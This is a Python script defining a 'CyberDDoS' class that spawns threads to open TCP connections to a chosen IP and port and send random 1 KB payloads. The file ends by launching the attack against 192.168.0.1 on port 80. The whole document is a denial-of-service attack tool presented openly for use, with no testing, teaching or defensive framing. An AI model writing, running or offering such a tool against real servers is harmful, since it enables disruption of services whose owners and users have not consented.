import socket
import random
import threading

class CyberDDoS:
    """
    Class to handle the CyberDDoS tool.

    Attributes:
    - target_ip: str
        The IP address of the target server.
    - target_port: int
        The port number of the target server.
    - num_threads: int
        The number of threads to use for the DDoS attack.
    """

    def __init__(self, target_ip: str, target_port: int, num_threads: int):
        """
        Constructor to instantiate the CyberDDoS class.

        Parameters:
        - target_ip: str
            The IP address of the target server.
        - target_port: int
            The port number of the target server.
        - num_threads: int
            The number of threads to use for the DDoS attack.
        """

        self.target_ip = target_ip
        self.target_port = target_port
        self.num_threads = num_threads

    def ddos_attack(self):
        """
        Performs the DDoS attack on the target server.

        This function creates multiple threads to send a large number of requests to the target server.

        Raises:
        - ValueError:
            Will raise an error if the target IP address or port number is invalid.
        """

        # Validating the target IP address
        try:
            socket.inet_aton(self.target_ip)
        except socket.error:
            raise ValueError("Invalid target IP address.")

        # Validating the target port number
        if not (0 <= self.target_port <= 65535):
            raise ValueError("Invalid target port number.")

        # Creating multiple threads for the DDoS attack
        for _ in range(self.num_threads):
            thread = threading.Thread(target=self.send_request)
            thread.start()

    def send_request(self):
        """
        Sends a request to the target server.

        This function creates a socket connection and sends a random payload to the target server.

        Raises:
        - ConnectionRefusedError:
            Will raise an error if the connection to the target server is refused.
        """

        # Creating a socket connection
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.target_ip, self.target_port))
        except ConnectionRefusedError:
            raise ConnectionRefusedError("Connection refused by the target server.")

        # Generating a random payload
        payload = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890', k=1024))

        # Sending the payload to the target server
        s.send(payload.encode())

        # Closing the socket connection
        s.close()

# Example of using the CyberDDoS class:

# Example: Performing a DDoS attack
ddos_tool = CyberDDoS("192.168.0.1", 80, 10)
ddos_tool.ddos_attack()
